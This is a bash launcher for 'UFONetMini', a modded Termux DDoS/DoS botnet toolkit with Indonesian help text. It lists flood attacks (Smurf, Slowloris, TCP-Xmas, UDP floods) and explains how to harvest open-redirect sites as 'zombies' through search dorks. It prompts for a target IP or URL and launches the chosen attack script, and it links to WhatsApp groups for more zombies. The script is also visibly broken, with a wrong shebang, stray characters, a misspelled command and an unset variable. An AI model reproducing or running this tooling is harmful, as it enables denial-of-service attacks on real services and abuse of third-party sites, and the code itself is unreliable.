#!/usr/bin/env python
# -*- coding: utf-8 -*-"
"""
UFONetMini - Denial of Service Toolkit - 2013/2018 - by psy (epsylon@riseup.net) AND Modder mr.spoon

You should have received a copy of the GNU General Public License along
with UFONetMini; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
"""
clear
blue='\033[34;1m'
green='\033[32;1m'
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'i
yellow='\033[33;1m'
clear
echo
echo $green"==============================================================================================

888     888 8888888888 .d88888b.  888b    888          888    
888     888 888        d88PY888b  8888b   888          888    
888     888 888       888     888 88888b  888          888    
888     888 8888888   888     888 888Y88b 888  .d88b.  888888 
888     888 888       888     888 888 Y88b888 d8P  Y8b 888    
888     888 888       888     888 888  Y88888 88888888 888    
Y88b. .d88P 888       Y88b. .d88P 888   Y8888 Y8b.     Y88b.  
 'Y88888P'  888        'Y88888P'  888    Y888  'Y8888   'Y8888

===============================================================================================

 UFONet [ DDoS+DoS ] Botnet/UfonetMini Modif By Mr.spoon
                        Mayat Hidup,Alif Jian,Kaka Ramdhani,Bad Syntax,Pikachu
===============================================================================================

###############################
# MOBILE VERSION UFONET MINI  #
###############################

- Website: 

   https://ufonet.03c8.net
   https://dsfofficial.tk

--help
"
echo
read -p "🔻./UFONET=>" in;
echo
if [ $in = --help ] || [ $in = --help ]
then
echo
echo $green"

###############################
# ALAT ALAT UNTUK MENJALANKAN #
###############################
Alat Alat Untuk Menjalankan Ufonet
 -python2.7
 -python3.7
 -perl
 -bash
 -curl
 -whois
 
 Install Semua Alat Alat
  --install

###############################
# DOWNLOAD ZOMBIE VIA DORKS   #
###############################

UFONet puede buscar en los resultados de diferentes motores de búsqueda para encontrar posibles sitios 
web vulnerables a 'Open Redirect'. 

Generalmente los parámetros de las peticiones, suelen ser similares a los siguientes:

        'proxy.php?url='
        'check.cgi?url='
        'checklink?uri='
        'validator?uri='

COMMAND UNTUK MENAMBAHKAN ZOMBIE

--addzombie

----
###############################
# MISSIONS                    #
###############################

--Mission.txt di gunakan untuk melihat riwayat attack terbaru

COMMAND UNTUK MELIHAT RIWAYAT ATTACK

missions

---
###############################
# ATTACK    DAN AMUNISI       #
###############################

Amunisi 
Versi Saat Ini Menyediakan 7 Amunisi
 
 *BOTNET --> (DDoS)
         /SMURF    :  BIG Packet Attack
         /TACHYON  :  TCP/UDP ATTACK
         /NEBULA   :  Fast HTTP request

 *CLOSE COMBAT --> (DoS)
         /LORIS    :  Slow HTTP requests
         /XMAS     :  TCP-Xmas Flooder
         /NUKE     :  TCP-STARVATION Attack
         /SAGATRON :  UDP ATTACK 1,5GB Packet

         
 
  
  
Memulai Penyerangan

Untuk Memulai Penyerangan Cukup Mengetikan Command Di Bawah Ini

Ufonet--Attack-<Amunisi>

-->
./Ufonet--Attack-Smurf
./Ufonet--Attack-Xmas
./Ufonet--Attack-Nuke
./Ufonet--Attack-Tachyon
./Ufonet--Attack-Loris
./Ufonet--Attack-Nebula
./Ufonet--Attack-Sagatron


###############################
# BLACKHOLE                   #
###############################
BlackHole Di Gunakan Untuk Meminta zombie Tambahan

command
--blackhole

###############################
# GLOBAL CHAT                 #
###############################
Global Chat MemungkinKan Anda Berinteraksi
Dengan Pengguna Dari Seluruh Dunia

command

--join"
fi




if [ $in = --addzombie ] || [ $in = --addzombie ]
then
cd core
cd mobs
nano zombie.txt
fi

#MODS

if [ $in = --missions ] || [ $in = --missions ]
then
echo "BELUM TERSEDIA"
fi


if [ $in = ./Ufonet--Attack-Smurf ] || [ $in = ./Ufonet--Attack-Smurf ]
then
printf "Anda menggunakan Smurf" >> $missions.txt
cd core
cd mobs
python2 smurf.py
fi

#MODS3

if [ $in = ./Ufonet--Attack-Xmas ] || [ $in = ./Ufonet--Attack-Xmas ]
then
printf "Anda menggunakan Xmas" >> $missions.txt
cd core
cd mobs
python2 xmas.py
fi

#MODS4

if [ $in = ./Ufonet--Attack-Nuke ] || [ $in = ./Ufonet--Attack-Nuke ]
then
cd core
cd mobs
read -p "IP TARGET:" ip;
printf "Anda menggunakan Nuke" >> $missions.txt
python nuke.py -s$nuke -p80 -t100
fi

#MODS

if [ $in = ./Ufonet--Attack-Tachyon ] || [ $in = ./Ufonet--Attack-Tachyon ]
then
printf "Anda menggunakan Tachyon" >> $missions.txt
cd core
cd mobs
perl tachyon.pl
fi

#MODS6

if [ $in = ./Ufonet--Attack-Loris ] || [ $in = ./Ufonet--Attack-Loris ]
then
printf "Anda menggunakan Loris" >> $missions.txt
read -p "IP TARGET:" tar;
cd core
cd mobs
python2 loris.py $tar 80 100
fi

if [ $in = ./Ufonet--Attack-Nebula ] || [ $in = ./Ufonet--Attack-Nebula ]
then
printf "Anda menggunakan Nebula" >> $missions.txt
cd core
cd mobs
read -p "URL TARGET:" ne;
clang smurf.c $ne 80
fi

if [ $in = ./Ufonet--Attack-Sagatron ] || [ $in = ./Ufonet--Attack-Sagatron ]
then
printf "Anda menggunakan Sagatron" >> $missions.txt
cd core
cd mobs
read -p "TARGET IP" sa;
perl sagatron.pl $sa
fi

if [ $in = --blackhole ] || [ $in = --blackhole ]
then
clear
termux-open-url https://api.whatsapp.com/send?phone=6282331787920&text=blackhole
fi

if [ $in = --join ] || [ $in = --join ]
then
clear
termux-open-url https://chat.whatsapp.com/HWunTpxLsha6bZNm4niZuL
fi

#install

if [ $in = --install ] || [ $in = --install ]
then
pkg install toilet
pkg lnstall ruby
gem install lolcat
pkg install pip2
pkg install nano
pkg install curl
pkg install clang
pkg install python
pkg install perl
pkg install python2
echo $green"SELESAI"
sleep 1
sh start.sh
sleep 1
fi